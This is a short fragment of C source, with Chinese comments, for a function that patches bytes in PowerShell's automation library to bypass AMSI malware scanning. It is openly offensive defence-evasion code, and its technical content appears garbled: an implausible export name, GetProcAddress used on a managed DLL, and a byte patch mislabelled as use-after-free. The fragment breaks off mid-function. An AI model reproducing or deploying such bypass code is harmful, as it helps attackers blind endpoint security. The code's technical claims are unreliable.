// PowerShell 启动后, 在受控进程中调用:
//   SetGlobal("amsiUacInitialize", 0)  或 $PSVersionTable 走 < 5.1 老引擎
// 注意: 只在 PowerShell 进程内有效, 跨进程无效 —— 它是 UAF 而非代码改写。
// ---------------------------------------------------------------------------
static int AmsiBypass_PowerShellUac(void)
{
    HMODULE ps = GetModuleHandleW(L"System.Management.Automation.dll");
    if (!ps) return 0;
    void* fn = GetProcAddress(ps, "AmsiUacInitialize");
    if (!fn) return 0;
    unsigned int zero = 0;
    return PatchBytes(fn, &zero, 4) == PATCH_OK;   // 地址==值 触发 UAF, Amsi 静默失败
